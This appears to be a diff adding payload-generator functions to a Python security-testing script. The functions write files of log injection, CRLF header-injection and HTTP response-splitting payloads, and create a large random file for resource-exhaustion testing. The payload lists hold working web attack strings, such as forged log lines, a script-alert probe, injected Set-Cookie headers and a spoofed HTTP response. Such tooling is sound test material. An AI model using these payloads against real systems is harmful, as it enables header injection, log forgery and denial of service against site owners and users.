@@ -331,3 +331,56 @@ def generate_command_injection_payloads(output_filename, payloads=None):
     except Exception as e:
         logging.error(f"Failed to create Command Injection payloads file: {e}")
         return False
+
+# --- Other Payload Generators ---
+
+def generate_log_injection_payloads(output_filename, payloads=None):
+    """
+    Generates a text file with common log injection payloads.
+    """
+    if payloads is None:
+        payloads = [
+            "User: admin%0alogin successful",
+            "User: admin%0a%0a<script>alert(1)</script>",
+            "127.0.0.1 - - [10/Oct/2000:13:55:36 -0700] \"GET /index.html HTTP/1.1\" 200 2326%0a127.0.0.1 - - [10/Oct/2000:13:55:36 -0700] \"GET /evil.php HTTP/1.1\" 404 1234",
+        ]
+    try:
+        with open(output_filename, "w") as f:
+            f.write("\\n".join(payloads))
+        logging.info(f"Successfully created Log Injection payloads file: {output_filename}")
+        return True
+    except Exception as e:
+        logging.error(f"Failed to create Log Injection payloads file: {e}")
+        return False
+
+def generate_crlf_injection_payloads(output_filename, payloads=None):
+    """
+    Generates a text file with common CRLF injection payloads for testing.
+    """
+    if payloads is None:
+        payloads = [
+            "%0d%0aSet-Cookie:crlf=true",
+            "\\r\\nSet-Cookie:crlf=true",
+            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<h1>CRLF</h1>",
+        ]
+    try:
+        with open(output_filename, "w") as f:
+            f.write("\\n".join(payloads))
+        logging.info(f"Successfully created CRLF Injection payloads file: {output_filename}")
+        return True
+    except Exception as e:
+        logging.error(f"Failed to create CRLF Injection payloads file: {e}")
+        return False
+
+def generate_large_file(output_filename, size_mb=10):
+    """
+    Generates a large file of a specified size in MB for resource exhaustion testing.
+    """
+    try:
+        with open(output_filename, 'wb') as f:
+            f.write(os.urandom(size_mb * 1024 * 1024))
+        logging.info(f"Successfully created large file ({size_mb}MB): {output_filename}")
+        return True
+    except Exception as e:
+        logging.error(f"Failed to create large file: {e}")
+        return False
